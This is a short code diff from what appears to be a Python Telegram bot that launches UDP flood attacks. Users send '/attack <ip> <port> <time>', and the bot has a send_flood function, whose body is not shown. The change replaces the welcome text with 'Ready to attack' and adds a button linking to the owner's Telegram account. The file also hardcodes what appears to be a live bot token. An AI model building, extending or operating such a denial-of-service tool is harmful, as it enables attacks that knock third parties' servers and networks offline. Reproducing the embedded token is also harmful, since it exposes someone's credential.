@@ -3,7 +3,7 @@ import time
 import asyncio
 import random
 import threading
-from telegram import Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # 👉 अपने Telegram Bot का Token यहाँ डालें
@@ -11,7 +11,11 @@ BOT_TOKEN = "7744875151:AAF8P1vSd8awHrmaGmWQiI6d-S_fgoPvLkY"
 
 # /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 Welcome Pawan Bhai! Use: /attack <ip> <port> <time>")
+    keyboard = [
+        [InlineKeyboardButton("📩 DM Me", url="https://t.me/VIP_OWNER9")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("✅ Ready to attack", reply_markup=reply_markup)
 
 # UDP flood function
 def send_flood(ip, port, duration):
